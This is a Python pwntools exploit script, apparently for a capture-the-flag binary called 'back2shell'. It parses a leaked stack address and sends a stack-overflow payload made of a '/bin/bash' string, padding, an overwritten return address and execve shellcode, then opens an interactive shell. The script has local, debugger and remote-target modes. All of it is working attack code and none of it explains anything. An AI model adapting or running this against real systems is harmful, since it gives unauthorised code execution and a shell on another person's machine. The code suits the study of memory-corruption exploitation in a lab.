from pwn import *

def con(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	elif args.GDB:
		return gdb.debug(exe, gdbscript='''
            b *0x000000000040183e
			c
			''')
	else:
		return process(exe)


exe = './back2shell'
io = con()
elf = context.binary = ELF(exe, checksec = False)

context.log_level = 'info'

sc = asm('''
    lea rdi, [rsp-34]
    xor rdx, rdx
    xor rsi, rsi
    mov rax, 59
    syscall 

        ''')


io.recvuntil(b'Helloworld!!! Welcome to my challenge!\n')
leaked = int(io.recvline().strip(),16)

info(hex(leaked))

payload = b'/bin/bash\x00'
payload += b'\x90'*(18-len(payload)) + p64(0x0000000000401016)
payload += p64(leaked+0x26+len(payload)+8)
payload += sc
info(len(payload))

io.sendline((payload))
io.interactive()
